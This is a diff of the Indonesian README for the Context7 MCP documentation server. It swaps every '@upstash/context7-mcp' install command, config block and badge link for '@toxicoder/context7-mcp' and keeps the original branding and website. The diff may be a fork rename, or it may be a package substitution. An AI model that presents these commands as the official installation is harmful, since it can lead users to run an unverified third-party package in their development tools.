@@ -1,6 +1,6 @@
 # Context7 MCP - Dokumentasi Kode Terkini Untuk Setiap Permintaan
 
-[![Website](https://img.shields.io/badge/Website-context7.com-blue)](https://context7.com) [![smithery badge](https://smithery.ai/badge/@upstash/context7-mcp)](https://smithery.ai/server/@upstash/context7-mcp) [<img alt="Install in VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Install%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40upstash%2Fcontext7-mcp%40latest%22%5D%7D)
+[![Website](https://img.shields.io/badge/Website-context7.com-blue)](https://context7.com) [![smithery badge](https://smithery.ai/badge/@toxicoder/context7-mcp)](https://smithery.ai/server/@toxicoder/context7-mcp) [<img alt="Install in VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Install%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40toxicoder%2Fcontext7-mcp%40latest%22%5D%7D)
 [![English](https://img.shields.io/badge/docs-English-blue)](../README.md) [![繁體中文](https://img.shields.io/badge/docs-繁體中文-yellow)](./README.zh-TW.md) [![简体中文](https://img.shields.io/badge/docs-简体中文-yellow)](./README.zh-CN.md) [![日本語](https://img.shields.io/badge/docs-日本語-b7003a)](./README.ja.md) [![한국어 문서](https://img.shields.io/badge/docs-한국어-green)](./README.ko.md) [![Documentación en Español](https://img.shields.io/badge/docs-Español-orange)](./README.es.md) [![Documentation en Français](https://img.shields.io/badge/docs-Français-blue)](./README.fr.md) [![Documentação em Português (Brasil)](<https://img.shields.io/badge/docs-Português%20(Brasil)-purple>)](./README.pt-BR.md) [![Documentazione in italiano](https://img.shields.io/badge/docs-Italian-red)](./README.it.md) [![Dokumentasi Bahasa Indonesia](https://img.shields.io/badge/docs-Bahasa%20Indonesia-pink)](./README.id-ID.md) [![Dokumentation auf Deutsch](https://img.shields.io/badge/docs-Deutsch-darkgreen)](./README.de.md) [![Документация на русском языке](https://img.shields.io/badge/docs-Русский-darkblue)](./README.ru.md) [![Українська документація](https://img.shields.io/badge/docs-Українська-lightblue)](./README.uk.md) [![Türkçe Doküman](https://img.shields.io/badge/docs-Türkçe-blue)](./README.tr.md) [![Arabic Documentation](https://img.shields.io/badge/docs-Arabic-white)](./README.ar.md)
 
 ## ❌ Tanpa Context7
@@ -44,11 +44,11 @@ Kunjungi [panduan penambahan proyek](./adding-projects.md) untuk mempelajari car
 
 <details>
 <summary><b>Menginstal melalui Smithery</b></summary>
-Untuk menginstal Context7 MCP Server untuk klien apa pun secara otomatis melalui [Smithery](https://smithery.ai/server/@upstash/context7-mcp):
+Untuk menginstal Context7 MCP Server untuk klien apa pun secara otomatis melalui [Smithery](https://smithery.ai/server/@toxicoder/context7-mcp):
 ```bash
-npx -y @smithery/cli@latest install @upstash/context7-mcp --client <NAMA_KLIEN> --key <KUNCI_SMITHERY_ANDA>
+npx -y @smithery/cli@latest install @toxicoder/context7-mcp --client <NAMA_KLIEN> --key <KUNCI_SMITHERY_ANDA>
 ```
-Anda dapat menemukan kunci Smithery Anda di [halaman web Smithery.ai](https://smithery.ai/server/@upstash/context7-mcp).
+Anda dapat menemukan kunci Smithery Anda di [halaman web Smithery.ai](https://smithery.ai/server/@toxicoder/context7-mcp).
 </details>
 
 <details>
@@ -80,7 +80,7 @@ Menyalin konfigurasi berikut ke file `~/.cursor/mcp.json` Anda adalah pendekatan
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -94,7 +94,7 @@ Menyalin konfigurasi berikut ke file `~/.cursor/mcp.json` Anda adalah pendekatan
   "mcpServers": {
     "context7": {
       "command": "bunx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -109,7 +109,7 @@ Menyalin konfigurasi berikut ke file `~/.cursor/mcp.json` Anda adalah pendekatan
   "mcpServers": {
     "context7": {
       "command": "deno",
-      "args": ["run", "--allow-env=NO_DEPRECATION,TRACE_DEPRECATION", "--allow-net", "npm:@upstash/context7-mcp"]
+      "args": ["run", "--allow-env=NO_DEPRECATION,TRACE_DEPRECATION", "--allow-net", "npm:@toxicoder/context7-mcp"]
     }
   }
 }
@@ -140,7 +140,7 @@ Tambahkan ini ke file konfigurasi MCP Windsurf Anda. Lihat [dokumentasi MCP Wind
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -172,7 +172,7 @@ Untuk detail lebih lanjut, kunjungi [dokumentasi Trae](https://docs.trae.ai/ide/
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -182,8 +182,8 @@ Untuk detail lebih lanjut, kunjungi [dokumentasi Trae](https://docs.trae.ai/ide/
 
 <details>
 <summary><b>Instal di VS Code</b></summary>
-[<img alt="Install in VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Install%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40upstash%2Fcontext7-mcp%40latest%22%5D%7D)
-[<img alt="Install in VS Code Insiders (npx)" src="https://img.shields.io/badge/VS_Code_Insiders-VS_Code_Insiders?style=flat-square&label=Install%20Context7%20MCP&color=24bfa5">](https://insiders.vscode.dev/redirect?url=vscode-insiders%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40upstash%2Fcontext7-mcp%40latest%22%5D%7D)
+[<img alt="Install in VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Install%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40toxicoder%2Fcontext7-mcp%40latest%22%5D%7D)
+[<img alt="Install in VS Code Insiders (npx)" src="https://img.shields.io/badge/VS_Code_Insiders-VS_Code_Insiders?style=flat-square&label=Install%20Context7%20MCP&color=24bfa5">](https://insiders.vscode.dev/redirect?url=vscode-insiders%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40toxicoder%2Fcontext7-mcp%40latest%22%5D%7D)
 
 Tambahkan ini ke file konfigurasi MCP VS Code Anda. Lihat [dokumentasi MCP VS Code](https://code.visualstudio.com/docs/copilot/chat/mcp-servers) untuk info lebih lanjut.
 
@@ -208,7 +208,7 @@ Tambahkan ini ke file konfigurasi MCP VS Code Anda. Lihat [dokumentasi MCP VS Co
     "context7": {
       "type": "stdio",
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -240,7 +240,7 @@ Atau, untuk server lokal:
       "context7": {
         "type": "stdio",
         "command": "npx",
-        "args": ["-y", "@upstash/context7-mcp"]
+        "args": ["-y", "@toxicoder/context7-mcp"]
       }
     }
   }
@@ -258,7 +258,7 @@ Dapat diinstal melalui [Ekstensi Zed](https://zed.dev/extensions?query=Context7)
     "Context7": {
       "source": "custom",
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp", "--api-key", "YOUR_API_KEY"]
+      "args": ["-y", "@toxicoder/context7-mcp", "--api-key", "YOUR_API_KEY"]
     }
   }
 }
@@ -285,7 +285,7 @@ Atau, untuk server lokal:
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -306,7 +306,7 @@ claude mcp add --transport http context7 https://mcp.context7.com/mcp
 #### Koneksi Server Lokal Claude Code
 
 ```sh
-claude mcp add context7 -- npx -y @upstash/context7-mcp
+claude mcp add context7 -- npx -y @toxicoder/context7-mcp
 ```
 
 </details>
@@ -319,7 +319,7 @@ Tambahkan ini ke file `claude_desktop_config.json` Claude Desktop Anda. Lihat [d
   "mcpServers": {
     "Context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -345,7 +345,7 @@ Buka halaman "Pengaturan" aplikasi, navigasikan ke "Plugin," dan masukkan JSON b
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -364,7 +364,7 @@ Jika Anda lebih suka menjalankan server MCP dalam wadah Docker:
    FROM node:18-alpine
    WORKDIR /app
    # Instal versi terbaru secara global
-   RUN npm install -g @upstash/context7-mcp
+   RUN npm install -g @toxicoder/context7-mcp
    # Ekspor port default jika diperlukan (opsional, tergantung pada interaksi klien MCP)
    # EXPOSE 3000
    # Perintah default untuk menjalankan server
@@ -401,9 +401,9 @@ Konfigurasi di Windows sedikit berbeda dibandingkan Linux atau macOS (_`Cline` d
 ```json
 {
   "mcpServers": {
-    "github.com/upstash/context7-mcp": {
+    "github.com/toxicoder/context7-mcp": {
       "command": "cmd",
-      "args": ["/c", "npx", "-y", "@upstash/context7-mcp@latest"],
+      "args": ["/c", "npx", "-y", "@toxicoder/context7-mcp@latest"],
       "disabled": false,
       "autoApprove": []
     }
@@ -424,7 +424,7 @@ Untuk mengonfigurasi Context7 MCP di Augment Code, Anda dapat menggunakan antarm
 4. Klik tombol **+ Tambah MCP**.
 5. Masukkan perintah berikut:
    ```
-   npx -y @upstash/context7-mcp@latest
+   npx -y @toxicoder/context7-mcp@latest
    ```
 6. Beri nama MCP: **Context7**.
 7. Klik tombol **Tambah**.
@@ -445,7 +445,7 @@ Untuk mengonfigurasi Context7 MCP di Augment Code, Anda dapat menggunakan antarm
     {
       "name": "context7",
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   ]
 }
@@ -479,7 +479,7 @@ Tambahkan ini ke file konfigurasi MCP Roo Code Anda. Lihat [dokumentasi MCP Roo 
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -499,7 +499,7 @@ Untuk mengonfigurasi Context7 MCP di Zencoder, ikuti langkah-langkah berikut:
     "command": "npx",
     "args": [
         "-y",
-        "@upstash/context7-mcp@latest"
+        "@toxicoder/context7-mcp@latest"
     ]
 }
 ```
@@ -514,7 +514,7 @@ Tambahkan ini ke file konfigurasi Amazon Q Developer CLI Anda. Lihat [dokumentas
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp@latest"]
+      "args": ["-y", "@toxicoder/context7-mcp@latest"]
     }
   }
 }
@@ -551,7 +551,7 @@ Lihat [Dokumentasi JetBrains AI Assistant](https://www.jetbrains.com/help/ai-ass
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -572,7 +572,7 @@ Lihat [Dokumentasi Protokol Konteks Model Warp](https://docs.warp.dev/knowledge-
     "command": "npx",
     "args": [
       "-y",
-      "@upstash/context7-mcp"
+      "@toxicoder/context7-mcp"
     ],
     "env": {},
     "working_directory": null,
@@ -606,7 +606,7 @@ Tambahkan ini ke file konfigurasi Opencode Anda. Lihat [dokumentasi MCP Opencode
   "mcp": {
     "context7": {
       "type": "local",
-      "command": ["npx", "-y", "@upstash/context7-mcp"],
+      "command": ["npx", "-y", "@toxicoder/context7-mcp"],
       "enabled": true
     }
   }
@@ -666,7 +666,7 @@ Atau, untuk server lokal:
       "type": "local",
       "command": "npx",
       "tools": ["get-library-docs", "resolve-library-id"],
-      "args": ["-y", "@upstash/context7-mcp", "--api-key", "YOUR_API_KEY"]
+      "args": ["-y", "@toxicoder/context7-mcp", "--api-key", "YOUR_API_KEY"]
     }
   }
 }
@@ -689,7 +689,7 @@ Lihat [Dokumentasi Protokol Konteks Model Kiro](https://kiro.dev/docs/mcp/config
     "command": "npx",
     "args": [
       "-y",
-      "@upstash/context7-mcp"
+      "@toxicoder/context7-mcp"
     ],
     "env": {},
     "disabled": false,
@@ -710,7 +710,7 @@ Tambahkan konfigurasi berikut ke pengaturan server MCP OpenAI Codex Anda:
 
 ```toml
 [mcp_servers.context7]
-args = ["-y", "@upstash/context7-mcp"]
+args = ["-y", "@toxicoder/context7-mcp"]
 command = "npx"
 ```
 
@@ -742,7 +742,7 @@ Lihat [Dukungan MCP LM Studio](https://lmstudio.ai/blog/lmstudio-v0.3.17) untuk 
   "mcpServers": {
     "Context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -836,7 +836,7 @@ bun run dist/index.js --transport http --port 8080
 <details>
 <summary><b>Pengujian dengan MCP Inspector</b></summary>
 ```bash
-npx -y @modelcontextprotocol/inspector npx @upstash/context7-mcp
+npx -y @modelcontextprotocol/inspector npx @toxicoder/context7-mcp
 ```
 </details>
 
@@ -850,7 +850,7 @@ Jika Anda mengalami `ERR_MODULE_NOT_FOUND`, coba gunakan `bunx` alih-alih `npx`:
   "mcpServers": {
     "context7": {
       "command": "bunx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -866,7 +866,7 @@ Untuk kesalahan seperti `Error: Cannot find module 'uriTemplate.js'`, coba gunak
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "--node-options=--experimental-vm-modules", "@upstash/context7-mcp@1.0.6"]
+      "args": ["-y", "--node-options=--experimental-vm-modules", "@toxicoder/context7-mcp@1.0.6"]
     }
   }
 }
@@ -881,7 +881,7 @@ Gunakan bendera `--experimental-fetch` untuk melewati masalah terkait TLS:
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "--node-options=--experimental-fetch", "@upstash/context7-mcp"]
+      "args": ["-y", "--node-options=--experimental-fetch", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -921,7 +921,7 @@ Tetap terbaru dan bergabunglah dengan komunitas kami:
 
 ## ⭐ Sejarah Bintang
 
-[![Star History Chart](https://api.star-history.com/svg?repos=upstash/context7&type=Date)](https://www.star-history.com/#upstash/context7&Date)
+[![Star History Chart](https://api.star-history.com/svg?repos=toxicoder/context7&type=Date)](https://www.star-history.com/#toxicoder/context7&Date)
 
 ## 📄 Lisensi
 
